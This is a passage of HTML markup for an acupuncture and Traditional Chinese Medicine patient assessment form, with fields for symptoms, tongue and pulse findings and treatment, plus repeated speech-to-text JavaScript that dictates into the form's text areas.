<option value="DEFICIENT">DEFICIENT</option>
<option value="YANG">YANG</option>
<option value="YIN">YIN</option>           </select>
    </div><div class="form-group col-md-2" align= "center"> <strong> ETIOLOGY</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x857"   placeholder="" id = "x857" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-3" align= "center"> <strong> TOM DIAGNOSIS SYNDROME / DIFFERENTATION</strong></div><div class="form-group col-md-3" align= "center"> <strong> TREATMENT PRINCIPLE</strong></div><div class="form-group col-md-6" align= "center"> <strong> ACUPUNTURE POINTS  tonify (t), Sedantig (T), Even (I), Electro acupuntura (E), Mosa (M)</strong></div>
   <script type="text/javascript">


     var recognition1733;
     var recognizing1733 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1733 = new webkitSpeechRecognition();
      recognition1733.lang = "es-CO";
      recognition1733.continuous = true;
      recognition1733.interimResults = true;

      recognition1733.onstart = function() {
        recognizing1733 = true;
        console.log("empezando a eschucar");
      }
      recognition1733.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x620").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1733.onerror = function(event) {
          }
          recognition1733.onend = function() {
            recognizing1733 = false;
            document.getElementById("procesar1733").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1733() {

          if (recognizing1733 == false) {
            recognition1733.start();
            recognizing1733 = true;
            document.getElementById("procesar1733").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1733.stop();
            recognizing1733 = false;
            document.getElementById("procesar1733").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1733()" id="procesar1733"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x620" name="x620"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1734;
     var recognizing1734 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1734 = new webkitSpeechRecognition();
      recognition1734.lang = "es-CO";
      recognition1734.continuous = true;
      recognition1734.interimResults = true;

      recognition1734.onstart = function() {
        recognizing1734 = true;
        console.log("empezando a eschucar");
      }
      recognition1734.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x376").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1734.onerror = function(event) {
          }
          recognition1734.onend = function() {
            recognizing1734 = false;
            document.getElementById("procesar1734").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1734() {

          if (recognizing1734 == false) {
            recognition1734.start();
            recognizing1734 = true;
            document.getElementById("procesar1734").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1734.stop();
            recognizing1734 = false;
            document.getElementById("procesar1734").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1734()" id="procesar1734"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x376" name="x376"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1735;
     var recognizing1735 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1735 = new webkitSpeechRecognition();
      recognition1735.lang = "es-CO";
      recognition1735.continuous = true;
      recognition1735.interimResults = true;

      recognition1735.onstart = function() {
        recognizing1735 = true;
        console.log("empezando a eschucar");
      }
      recognition1735.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x716").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1735.onerror = function(event) {
          }
          recognition1735.onend = function() {
            recognizing1735 = false;
            document.getElementById("procesar1735").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1735() {

          if (recognizing1735 == false) {
            recognition1735.start();
            recognizing1735 = true;
            document.getElementById("procesar1735").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1735.stop();
            recognizing1735 = false;
            document.getElementById("procesar1735").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-6">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1735()" id="procesar1735"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x716" name="x716"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div><div class="form-group col-md-12">
     <div align="left">  OTHER TRATMENTS </div>

     <select   name="xothertrat769[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>

      <option value="TUI NA">TUI NA</option>
<option value="ACUPRESSURE">ACUPRESSURE</option>
<option value="MOXA">MOXA</option>
<option value="CUPPING">CUPPING</option>
<option value="ELECTRO ACUPUNCTURE">ELECTRO ACUPUNCTURE</option>
<option value="HEAT PACK">HEAT PACK</option>
<option value="SEED">SEED</option>           </select>
    </div><div class="form-group col-md-2" align= "center"> <strong> CONDITION TREATED</strong></div><div class="form-group col-md-3">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="x299"   placeholder="" id = "x299" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-1" align= "center"> <strong> ICD</strong></div><div class="form-group col-md-3">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="x834"   placeholder="" id = "x834" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-1" align= "center"> <strong> CPT</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x233"   placeholder="" id = "x233" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-3" align= "center"> <strong> RECOMMENDATIONS & HERBAL FORMULA </strong></div><div class="form-group col-md-9">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-9 form-control input-lg" name="x174"   placeholder="" id = "x174" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-12" align= "center"> <strong> TEN QUESTIONS & ROS</strong></div><div class="form-group col-md-2" align= "center"> <strong> FEVER & CNILLS</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x724"   placeholder="" id = "x724" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-2" align= "center"> <strong> PERSPIRATION</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x195"   placeholder="" id = "x195" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-2" align= "center"> <strong> THIRST</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x403"   placeholder="" id = "x403" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-2" align= "center"> <strong> APPETITE</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x298"   placeholder="" id = "x298" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> DIGESTION</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x562"   placeholder="" id = "x562" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> TASTE</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x454"   placeholder="" id = "x454" 0  value="0" maxlength="56">


   </div><div class="form-group col-md-1" align= "center"> <strong> BOWEL MOVEMENT</strong></div><div class="form-group col-md-1" align= "center"> <strong> FREQUENCY</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x957"   placeholder="" id = "x957" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> QUALITY</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x335"   placeholder="" id = "x335" 0  value="0" maxlength="12">


   </div><div class="form-group col-md-1" align= "center"> <strong> COLOR</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x282"   placeholder="" id = "x282" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> SMELL</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x413"   placeholder="" id = "x413" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> URINE</strong></div><div class="form-group col-md-1" align= "center"> <strong> FREQUENCY</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x143"   placeholder="" id = "x143" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1" align= "center"> <strong> AMOUNT</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x709"   placeholder="" id = "x709" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1" align= "center"> <strong> COLOR </strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x575"   placeholder="" id = "x575" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-2" align= "center"> <strong> SMELL</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x752"   placeholder="" id = "x752" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-2" align= "center"> <strong> SLEP</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x259"   placeholder="" id = "x259" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> PAIN </strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x676"   placeholder="" id = "x676" 0  value="0" maxlength="56">


   </div><div class="form-group col-md-2" align= "center"> <strong> CONSCIOUSNESS</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x638"   placeholder="" id = "x638" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> ENERGY LEVEL </strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x606"   placeholder="" id = "x606" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> STRESS LEVEL</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x217"   placeholder="" id = "x217" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-12" align= "center"> <strong> SYSTEMIC REVIEW + PALPATION / PERCUSSION / INSPECTION / INQUIRING</strong></div>
   <div class="col-md-6">
    <div class="form-group col-md-2" align= "center"> <strong> HEAD / FACE</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x120"   placeholder="" id = "x120" 0  value="0" maxlength="56">


   </div><div class="form-group col-md-2" align= "center"> <strong> EENT</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x659"   placeholder="" id = "x659" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> SKIN</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x953"   placeholder="" id = "x953" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> CHEST / BREAST</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x930"   placeholder="" id = "x930" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> RESPIRATORY</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x562"   placeholder="" id = "x562" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> CARDIOVASCULAR </strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x979"   placeholder="" id = "x979" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> GASTROINTERSTINAL</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x547"   placeholder="" id = "x547" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-2" align= "center"> <strong> MUSCULOSKELETAL</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x712"   placeholder="" id = "x712" 0  value="0" maxlength="56">


   </div><div class="form-group col-md-2" align= "center"> <strong> NEUROLOGICAL </strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x838"   placeholder="" id = "x838" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> SPINE</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x211"   placeholder="" id = "x211" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> EXTREMITIES</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x840"   placeholder="" id = "x840" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-2" align= "center"> <strong> DTR / SENSORY</strong></div><div class="form-group col-md-10">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-10 form-control input-lg" name="x356"   placeholder="" id = "x356" 0  value="0" maxlength="45">


   </div>
 </div>
 <div class="col-md-6 align center" align="center" style="height:100%">
  <br>
  <br><br><br><br><br><br><br><br>
  <img src="img/config/img-ejemplo.jpeg" class="img img-responsive">  
</div>

<div class="col-md-12"></div>
<br><br>
<div class="form-group col-md-2" align= "center"> <strong> OTHER / DESCRIBE THE ABNORMALITIES</strong></div>
<script type="text/javascript">


 var recognition1839;
 var recognizing1839 = false;
 if (!('webkitSpeechRecognition' in window)) {
  alert("¡API no soportada!");
} else {

  recognition1839 = new webkitSpeechRecognition();
  recognition1839.lang = "es-CO";
  recognition1839.continuous = true;
  recognition1839.interimResults = true;

  recognition1839.onstart = function() {
    recognizing1839 = true;
    console.log("empezando a eschucar");
  }
  recognition1839.onresult = function(event) {

   for (var i = event.resultIndex; i < event.results.length; i++) {
    if(event.results[i].isFinal)
      document.getElementById("x670").value += event.results[i][0].transcript;
  }

            //texto
          }
          recognition1839.onerror = function(event) {
          }
          recognition1839.onend = function() {
            recognizing1839 = false;
            document.getElementById("procesar1839").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1839() {

          if (recognizing1839 == false) {
            recognition1839.start();
            recognizing1839 = true;
            document.getElementById("procesar1839").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1839.stop();
            recognizing1839 = false;
            document.getElementById("procesar1839").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-10">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1839()" id="procesar1839"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x670" name="x670"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div><div class="form-group col-md-12" align= "center"> <strong> WOMEN </strong></div><div class="form-group col-md-1" align= "center"> <strong> MENARCHE </strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x877"   placeholder="" id = "x877" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> MENOPAUSE </strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x610"   placeholder="" id = "x610" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> #OF PREGNANT</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x132"   placeholder="" id = "x132" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> #OF CHILD </strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x278"   placeholder="" id = "x278" 0  value="0" maxlength="54">


   </div><div class="form-group col-md-1" align= "center"> <strong> MISCARRIAGE</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x945"   placeholder="" id = "x945" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> LEUKORRHEA</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x966"   placeholder="" id = "x966" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> BIRTH CONTROL </strong></div><div class="form-group col-md-5">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-5 form-control input-lg" name="x505"   placeholder="" id = "x505" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> MENSTRUATION </strong></div><div class="form-group col-md-1" align= "center"> <strong> LMP</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x212"   placeholder="" id = "x212" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> CYCLE </strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x430"   placeholder="" id = "x430" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> QUANTILY </strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x260"   placeholder="" id = "x260" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> DURATION </strong></div><div class="form-group col-md-4">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-4 form-control input-lg" name="x586"   placeholder="" id = "x586" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> COLOR</strong></div><div class="form-group col-md-3">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="x973"   placeholder="" id = "x973" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> CLOTS</strong></div><div class="form-group col-md-3">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="x679"   placeholder="" id = "x679" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> DYSMENORRHE</strong></div><div class="form-group col-md-3">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="x840"   placeholder="" id = "x840" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-12" align= "center"> <strong> BODY</strong></div><div class="form-group col-md-12">
     <div align="left">  COLOR  </div>

     <select   name="xcolor798[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="PALE" >PALE </option>
      <option value="PINK" >PINK </option>
      <option value="RED" >RED </option>
      <option value="DARK" >DARK </option>
      <option value="RED" >RED </option>
      <option value="PURPLE" >PURPLE </option>
      <option value="REDDISH PURPLE" >REDDISH PURPLE </option>
      <option value="BLUISH PURPLE" >BLUISH PURPLE </option>
      <option value="RED TIP" >RED TIP </option>
      <option value="REDDER SIDE" >REDDER SIDE </option>
      <option value="ORANGE SIDE" >ORANGE SIDE </option>
      <option value="PURPLE SIDS" >PURPLE SIDS </option>           </select>
    </div><div class="form-group col-md-12">
     <div align="left">  SHAPE </div>

     <select   name="xshape540[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="STIFF">STIFF </option>
<option value="LONG">LONG </option>
<option value="FLACCID">FLACCID </option>
<option value="CRACKED">CRACKED </option>
<option value="SWOLLEN IN SIDES OR TIP OR CENTER">SWOLLEN IN SIDES OR TIP OR CENTER</option>
<option value="SHORT">SHORT </option>
<option value="ROLLED UP">ROLLED UP</option>
<option value="ROLLED DOWN">ROLLED DOWN</option>
<option value="ULCERATE">ULCERATE </option>
<option value="TOOTH MARKED">TOOTH MARKED</option>
<option value="HALF SWOLLEN">HALF SWOLLEN</option>
<option value="THIN">THIN </option>
<option value="THICK">THICK </option>
<option value="NARROW">NARROW </option>
<option value="DEVIATION">DEVIATION </option>
<option value="TREMBLING">TREMBLING </option>
<option value="NORMAL ">NORMAL </option>           </select>
    </div><div class="form-group col-md-12" align= "center"> <strong> COATING</strong></div><div class="form-group col-md-12">
     <div align="left">  COLOR  </div>

     <select   name="xcolor804[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="WHITE">WHITE</option>
<option value="YELLOW">YELLOW</option>
<option value="GRAY">GRAY</option>
<option value="BLACK">BLACK</option>
<option value="GREENISH">GREENISH</option>
<option value="HALF WHITE OR YELLOW CENTER OR SIDE OR CENTRAL SURFACE OR ROOT" >HALF WHITE OR YELLOW CENTER OR SIDE OR CENTRAL SURFACE OR ROOT</option>           </select>
    </div><div class="form-group col-md-12">
     <div align="left">  QUALITY </div>

     <select   name="xquality596[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="THIN">THIN</option>
<option value="THICK">THICK</option>
<option value="SCANTY">SCANTY</option>
<option value="NONE">NONE</option>
<option value="DRY">DRY</option>
<option value="WET">WET</option>
<option value="SLIPPERY">SLIPPERY</option>
<option value="GREASH">GREASH</option>
<option value="ROUGH">ROUGH</option>
<option value="STICKY">STICKY</option>
<option value="GRAPHIC">GRAPHIC</option>
<option value="MIRROR">MIRROR</option>           </select>
    </div><div class="form-group col-md-12" align= "center"> <strong> PULSE </strong></div><div class="form-group col-md-12" align= "center"> <strong> RT</strong></div><div class="form-group col-md-1" align= "center"> <strong> SUPERFICIAL</strong></div><div class="form-group col-md-1" align= "center"> <strong> RAPID</strong></div><div class="form-group col-md-1" align= "center"> <strong> EXCESS</strong></div><div class="form-group col-md-1" align= "center"> <strong> SURGING</strong></div><div class="form-group col-md-1" align= "center"> <strong> WIRY</strong></div><div class="form-group col-md-1" align= "center"> <strong> ROLLING</strong></div><div class="form-group col-md-1" align= "center"> <strong> MODERATE</strong></div><div class="form-group col-md-1" align= "center"> <strong> TENSE</strong></div><div class="form-group col-md-1" align= "center"> <strong> KNOTTED</strong></div><div class="form-group col-md-1">
     <div align="left">  1ª </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x1ª932"   placeholder="" id = "x1ª932" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1">
     <div align="left">  2ª </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x2ª306"   placeholder="" id = "x2ª306" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1">
     <div align="left">  3ª </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x3ª127"   placeholder="" id = "x3ª127" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> DEEP</strong></div><div class="form-group col-md-1" align= "center"> <strong> SLOW</strong></div><div class="form-group col-md-1" align= "center"> <strong> DEFICIENT</strong></div><div class="form-group col-md-1" align= "center"> <strong> CHOPPY</strong></div><div class="form-group col-md-1" align= "center"> <strong> THREADY</strong></div><div class="form-group col-md-1" align= "center"> <strong> SOGGY</strong></div><div class="form-group col-md-1" align= "center"> <strong> WEAK</strong></div><div class="form-group col-md-1" align= "center"> <strong> HURRIED</strong></div><div class="form-group col-md-1" align= "center"> <strong> INTERMITTENT</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x559"   placeholder="" id = "x559" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x654"   placeholder="" id = "x654" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x421"   placeholder="" id = "x421" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-12" align= "center"> <strong> LT</strong></div><div class="form-group col-md-1" align= "center"> <strong> SUPERFICIAL </strong></div><div class="form-group col-md-1" align= "center"> <strong> RAPID</strong></div><div class="form-group col-md-1" align= "center"> <strong> EXCESS</strong></div><div class="form-group col-md-1" align= "center"> <strong> SURGING</strong></div><div class="form-group col-md-1" align= "center"> <strong> WIRY</strong></div><div class="form-group col-md-1" align= "center"> <strong> ROLLING</strong></div><div class="form-group col-md-1" align= "center"> <strong> MODERATE</strong></div><div class="form-group col-md-1" align= "center"> <strong> TENSE</strong></div><div class="form-group col-md-1" align= "center"> <strong> KNOTTED</strong></div><div class="form-group col-md-1">
     <div align="left">  1ª  </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x1ª291"   placeholder="" id = "x1ª291" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1">
     <div align="left">  2ª </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x2ª885"   placeholder="" id = "x2ª885" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1">
     <div align="left">  3ª </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x3ª856"   placeholder="" id = "x3ª856" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-1" align= "center"> <strong> DEEP</strong></div><div class="form-group col-md-1" align= "center"> <strong> SLOW</strong></div><div class="form-group col-md-1" align= "center"> <strong> DEFICIENT </strong></div><div class="form-group col-md-1" align= "center"> <strong> CHOPPY</strong></div><div class="form-group col-md-1" align= "center"> <strong> THREADY</strong></div><div class="form-group col-md-1" align= "center"> <strong> SOGGY</strong></div><div class="form-group col-md-1" align= "center"> <strong> WEAK</strong></div><div class="form-group col-md-1" align= "center"> <strong> HURRIED </strong></div><div class="form-group col-md-1" align= "center"> <strong> INTERMITTENT Borrar Campo</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x701"   placeholder="" id = "x701" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x199"   placeholder="" id = "x199" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x973"   placeholder="" id = "x973" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-12" align= "center"> <strong> DIAGNOSIS &  TREATMENT</strong></div><div class="form-group col-md-4" align= "center"> <strong> EIGHT PRINCIPLES</strong></div><div class="form-group col-md-2" align= "center"> <strong> EXTERIOR / INTERIOR</strong></div><div class="form-group col-md-2" align= "center"> <strong> HEAT / COLD </strong></div><div class="form-group col-md-2" align= "center"> <strong> EXCESS / DEFICIENT</strong></div><div class="form-group col-md-2" align= "center"> <strong> YANG / YIN </strong></div><div class="form-group col-md-4" align= "center"> <strong> ETIOLOGY</strong></div><div class="form-group col-md-8">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-8 form-control input-lg" name="x464"   placeholder="" id = "x464" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-3" align= "center"> <strong> TCM  DIAGNOSIS SYNDROME / DIFFERENTIATION</strong></div><div class="form-group col-md-3" align= "center"> <strong> TREATMENT PRINCIPLE</strong></div><div class="form-group col-md-3" align= "center"> <strong> ACUPUNTURE POINTS  tonify (t), Sedantig (T), Even (I), Electro acupuntura (E), Moxa (M)</strong></div><div class="form-group col-md-3" align= "center"> <strong> HERBAL TREATMENT FORMULA HERBS MODIFICATION </strong></div><div class="form-group col-md-12" align= "center"> <strong> ...........................................................................................................................................................................................................................................................</strong></div>
   <script type="text/javascript">


     var recognition1959;
     var recognizing1959 = false;
